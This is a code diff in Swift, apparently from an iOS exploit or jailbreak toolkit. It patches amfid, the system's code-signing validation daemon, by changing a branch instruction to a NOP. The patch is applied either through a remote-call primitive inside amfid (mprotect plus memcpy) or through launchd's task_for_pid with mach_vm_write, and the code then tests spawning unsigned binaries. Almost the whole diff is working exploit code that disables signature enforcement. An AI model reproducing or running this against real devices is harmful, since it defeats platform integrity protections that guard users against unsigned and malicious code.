@@ -209,98 +209,199 @@ final class ExpAmfidNopFinal {
         log("  patch addr: 0x\(String(format:"%llx", patchAddr))")
         log("")
         
-        // Connect RC to amfid
+        // Connect RC to amfid directly (not via service name)
         log("[5/7] Connecting to amfid via RemoteCall...")
-        // Connect RC to amfid using rcinitDaemon (separate from SB connection)
-        dspmgr.shared.rcinitDaemon(
-            serviceName: "com.apple.amfi.xpc",
-            framework: nil,
-            process: "amfid",
-            migbypass: false
-        ) { [weak self] amfidRC in
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
             guard let self else { return }
             
-            guard let rc = amfidRC else {
-                self.log("❌ RC to amfid failed")
-                self.log("   Error: \(RemoteCall.lastInitError() ?? "unknown")")
-                self.log("   amfid may have restricted exception ports")
-                self.patchViaSpringBoardRelay(amfidPid: amfidPid, patchAddr: patchAddr)
-                return
+            let rc = RemoteCall(process: "amfid", useMigFilterBypass: false)
+            
+            DispatchQueue.main.async {
+                guard let rc = rc else {
+                    self.log("❌ RC to amfid failed")
+                    self.log("   Error: \(RemoteCall.lastInitError() ?? "unknown")")
+                    self.log("   amfid has restricted exception ports on iOS 18")
+                    self.patchViaSpringBoardRelay(amfidPid: amfidPid, patchAddr: patchAddr)
+                    return
+                }
+                
+                self.log("✅ Connected to amfid!")
+                self.log("")
+                self.log("[6/7] amfid patching itself...")
+                
+                // mprotect the page (amfid can mprotect its own memory!)
+                let pageAddr = patchAddr & ~0xFFF
+                let mprotectRet = RootExecutor.rcall(rc, "mprotect", pageAddr, 0x4000, 7) // PROT_ALL=7
+                self.log("  mprotect: ret=\(mprotectRet)")
+                
+                guard mprotectRet == 0 else {
+                    self.log("❌ mprotect failed (ret=\(mprotectRet))")
+                    rc.destroy()
+                    return
+                }
+                
+                // Read current instruction via memcpy into trojanMem
+                let readBuf = rc.trojanMem + 0x100
+                RootExecutor.rcall(rc, "memcpy", readBuf, patchAddr, 4)
+                let currentInsn = rc[readBuf].value32()
+                self.log("  current insn: 0x\(String(format:"%08x", currentInsn))")
+                
+                if currentInsn == 0xD503201F {
+                    self.log("✅ ALREADY PATCHED!")
+                    rc.destroy()
+                    self.testUnsignedSpawn()
+                    return
+                }
+                
+                guard (currentInsn & 0xFF000000) == 0x34000000 else {
+                    self.log("❌ NOT cbz: 0x\(String(format:"%08x", currentInsn))")
+                    rc.destroy()
+                    return
+                }
+                self.log("  ✅ confirmed cbz w22")
+                
+                // Write NOP (amfid writes to its own memory!)
+                let nopBuf = rc.trojanMem + 0x200
+                rc[nopBuf].setValue32(0xD503201F)
+                RootExecutor.rcall(rc, "memcpy", patchAddr, nopBuf, 4)
+                
+                // Verify
+                RootExecutor.rcall(rc, "memcpy", readBuf, patchAddr, 4)
+                let verify = rc[readBuf].value32()
+                
+                rc.destroy() // Release amfid immediately
+                
+                if verify == 0xD503201F {
+                    self.log("")
+                    self.log("╔══════════════════════════════════════╗")
+                    self.log("║  ✅✅✅ amfid PATCHED! cbz → NOP    ║")
+                    self.log("║  amfid patched ITSELF via RC         ║")
+                    self.log("║  ALL binaries now pass validation   ║")
+                    self.log("╚══════════════════════════════════════╝")
+                    self.log("")
+                    self.testUnsignedSpawn()
+                } else {
+                    self.log("❌ Verify failed: 0x\(String(format:"%08x", verify))")
+                }
+            }
+        }
+    }
+    
+    /// Fallback: try task_for_pid from launchd (uid=0 + task_for_pid-allow)
+    private func patchViaSpringBoardRelay(amfidPid: Int32, patchAddr: UInt64) {
+        log("")
+        log("── Fallback: task_for_pid from launchd ──")
+        log("  amfid RC failed (restricted exception ports)")
+        log("  Trying: launchd → task_for_pid(\(amfidPid)) → vm_write")
+        
+        guard dspmgr.shared.rcready else {
+            log("❌ RC not ready")
+            return
+        }
+        
+        RootExecutor.shared.executeAsRoot(operation: "amfid_tfp") { [weak self] rc in
+            guard let self else { return (false, "self nil", 0) }
+            
+            // task_for_pid(mach_task_self(), amfid_pid, &port)
+            let portBuf = rc.trojanMem + 0x500
+            rc[portBuf].setValue32(0)
+            
+            let selfTask = RootExecutor.rcall(rc, "mach_task_self")
+            let tfpRet = RootExecutor.rcall(rc, "task_for_pid",
+                selfTask, UInt64(bitPattern: Int64(amfidPid)), portBuf)
+            let taskPort = rc[portBuf].value32()
+            
+            self.log("  task_for_pid: ret=\(tfpRet) port=\(taskPort)")
+            
+            guard tfpRet == 0 && taskPort != 0 else {
+                self.log("❌ task_for_pid denied (ret=\(tfpRet))")
+                self.log("")
+                self.log("══ ALL APPROACHES EXHAUSTED ══")
+                self.log("Remaining options:")
+                self.log("  1. IOKit TC load (selector 2 — needs entitled process)")
+                self.log("  2. Patch kernel's amfid MIG handler return path")
+                self.log("  3. Find process with task_for_pid-allow entitlement")
+                return (false, "task_for_pid denied: ret=\(tfpRet)", UInt64(tfpRet))
             }
             
-            self.log("✅ Connected to amfid!")
-            self.log("")
-            self.log("[6/7] amfid patching itself...")
+            // SUCCESS! We have amfid's task port IN LAUNCHD's context
+            self.log("✅ Got amfid task port: \(taskPort)")
             
-            // mprotect the page (amfid can mprotect its own memory!)
+            // Do the patch entirely in launchd's context (port is valid here)
             let pageAddr = patchAddr & ~0xFFF
-            let mprotectRet = RootExecutor.rcall(rc, "mprotect", pageAddr, 0x4000, 7) // PROT_ALL=7
-            self.log("  mprotect: ret=\(mprotectRet)")
             
-            guard mprotectRet == 0 else {
-                self.log("❌ mprotect failed (ret=\(mprotectRet))")
-                rc.destroy()
-                return
+            // mach_vm_protect(task_port, page, 0x4000, false, VM_PROT_ALL)
+            let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
+                UInt64(taskPort), pageAddr, 0x4000, 0, 7)
+            self.log("  mach_vm_protect: ret=\(protRet)")
+            
+            guard protRet == 0 else {
+                self.log("❌ mach_vm_protect failed")
+                return (false, "mach_vm_protect failed: ret=\(protRet)", UInt64(protRet))
             }
             
-            // Read current instruction to verify
-            let readBuf = rc.trojanMem + 0x100
-            rc.remoteRead(patchAddr, to: nil, size: 4)
-            // Actually use memcpy to read
-            RootExecutor.rcall(rc, "memcpy", readBuf, patchAddr, 4)
+            // mach_vm_read_overwrite to verify current instruction
+            let readBuf = rc.trojanMem + 0x600
+            let outSizeBuf = rc.trojanMem + 0x610
+            rc[outSizeBuf].setValue64(4)
+            rc[readBuf].setValue32(0)
+            
+            let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
+                UInt64(taskPort), patchAddr, 4, readBuf, outSizeBuf)
             let currentInsn = rc[readBuf].value32()
-            self.log("  current insn: 0x\(String(format:"%08x", currentInsn))")
+            self.log("  read: ret=\(readRet) insn=0x\(String(format:"%08x", currentInsn))")
             
             if currentInsn == 0xD503201F {
-                self.log("✅ ALREADY PATCHED!")
-                rc.destroy()
-                self.testUnsignedSpawn()
-                return
+                self.log("✅ ALREADY PATCHED (NOP)!")
+                return (true, "already patched", 0)
             }
             
             guard (currentInsn & 0xFF000000) == 0x34000000 else {
                 self.log("❌ NOT cbz: 0x\(String(format:"%08x", currentInsn))")
-                rc.destroy()
-                return
+                return (false, "not cbz instruction", UInt64(currentInsn))
             }
             self.log("  ✅ confirmed cbz w22")
             
-            // Write NOP (amfid writes to its own memory!)
-            let nopBuf = rc.trojanMem + 0x200
+            // Write NOP via mach_vm_write(task_port, addr, data_ptr, 4)
+            let nopBuf = rc.trojanMem + 0x620
             rc[nopBuf].setValue32(0xD503201F)
-            RootExecutor.rcall(rc, "memcpy", patchAddr, nopBuf, 4)
+            let writeRet = RootExecutor.rcall(rc, "mach_vm_write",
+                UInt64(taskPort), patchAddr, nopBuf, 4)
+            self.log("  mach_vm_write: ret=\(writeRet)")
+            
+            guard writeRet == 0 else {
+                self.log("❌ mach_vm_write failed")
+                return (false, "mach_vm_write failed: ret=\(writeRet)", UInt64(writeRet))
+            }
             
             // Verify
-            RootExecutor.rcall(rc, "memcpy", readBuf, patchAddr, 4)
+            rc[readBuf].setValue32(0)
+            rc[outSizeBuf].setValue64(4)
+            RootExecutor.rcall(rc, "mach_vm_read_overwrite",
+                UInt64(taskPort), patchAddr, 4, readBuf, outSizeBuf)
             let verify = rc[readBuf].value32()
-            
-            rc.destroy() // Release amfid immediately
             
             if verify == 0xD503201F {
                 self.log("")
                 self.log("╔══════════════════════════════════════╗")
                 self.log("║  ✅✅✅ amfid PATCHED! cbz → NOP    ║")
-                self.log("║  amfid patched ITSELF via RC         ║")
+                self.log("║  via launchd task_for_pid + vm_write ║")
                 self.log("║  ALL binaries now pass validation   ║")
                 self.log("╚══════════════════════════════════════╝")
                 self.log("")
-                self.testUnsignedSpawn()
+                return (true, "PATCHED via launchd tfp!", UInt64(verify))
             } else {
                 self.log("❌ Verify failed: 0x\(String(format:"%08x", verify))")
+                return (false, "verify failed", UInt64(verify))
             }
         }
-    }
-    
-    /// Fallback: use SpringBoard to relay ptrace attach to amfid
-    private func patchViaSpringBoardRelay(amfidPid: Int32, patchAddr: UInt64) {
-        log("  (SpringBoard relay not implemented yet)")
-        log("")
-        log("══ BLOCKED ══")
-        log("All approaches exhausted for this session.")
-        log("Next steps to try:")
-        log("  1. RC to amfid (if connection succeeds)")
-        log("  2. IOKit TC load (retry — was inconsistent)")
-        log("  3. Find process with task_for_pid-allow")
+        
+        // After executeAsRoot completes, test spawn
+        DispatchQueue.main.asyncAfter(deadline: .now() + 8) { [weak self] in
+            if let r = RootExecutor.shared.lastResult, r.operation == "amfid_tfp", r.success {
+                self?.testUnsignedSpawn()
+            }
+        }
     }
     
     private func performPatchViaLaunchd(amfidPid: Int32) {
